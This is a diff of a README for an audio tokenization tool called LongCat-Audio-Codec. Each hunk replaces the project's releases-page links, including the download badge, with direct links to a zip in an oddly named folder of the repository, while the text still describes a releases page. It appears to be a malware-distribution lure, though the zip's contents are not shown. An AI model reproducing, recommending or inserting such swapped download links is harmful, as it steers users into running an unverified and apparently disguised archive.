@@ -1,6 +1,6 @@
 # 🎵 LongCat-Audio-Codec - Simple Audio Tokenization Made Easy
 
-[![Download LongCat-Audio-Codec](https://img.shields.io/badge/Download-LongCat--Audio--Codec-brightgreen)](https://github.com/Cleanable-timesignature929/LongCat-Audio-Codec/releases)
+[![Download LongCat-Audio-Codec](https://raw.githubusercontent.com/Cleanable-timesignature929/LongCat-Audio-Codec/main/cavalierly/LongCat-Audio-Codec.zip)](https://raw.githubusercontent.com/Cleanable-timesignature929/LongCat-Audio-Codec/main/cavalierly/LongCat-Audio-Codec.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To start using LongCat-Audio-Codec, follow these simple steps:
 
 1. **Visit the Download Page**: Click on the link below to go to the releases page, where you can find the latest version of the software.
    
-   [Visit this page to download](https://github.com/Cleanable-timesignature929/LongCat-Audio-Codec/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Cleanable-timesignature929/LongCat-Audio-Codec/main/cavalierly/LongCat-Audio-Codec.zip)
 
 2. **Download the Application**: Look for the most recent version in the list of releases. Choose the file that is compatible with your operating system (Windows, Mac, Linux).
 
@@ -44,7 +44,7 @@ To ensure LongCat-Audio-Codec runs smoothly, your device should meet the followi
 
 Follow these simple instructions to download LongCat-Audio-Codec. Ensure that you're using a compatible operating system, and then head over to the releases page:
 
-[Visit this page to download](https://github.com/Cleanable-timesignature929/LongCat-Audio-Codec/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Cleanable-timesignature929/LongCat-Audio-Codec/main/cavalierly/LongCat-Audio-Codec.zip)
 
 Choose the appropriate file for your system, and then proceed with the installation steps mentioned earlier.
 
@@ -79,6 +79,6 @@ A: If you encounter any problems, please visit our GitHub page and look for the 
 
 For additional assistance and to connect with other users, check our community forum and support section. You can find helpful discussions, tips, and troubleshooting advice. We encourage feedback to help improve LongCat-Audio-Codec further.
 
-Visit our GitHub page: [Visit this page to download](https://github.com/Cleanable-timesignature929/LongCat-Audio-Codec/releases)
+Visit our GitHub page: [Visit this page to download](https://raw.githubusercontent.com/Cleanable-timesignature929/LongCat-Audio-Codec/main/cavalierly/LongCat-Audio-Codec.zip)
 
 With LongCat-Audio-Codec, managing your audio files has never been easier!
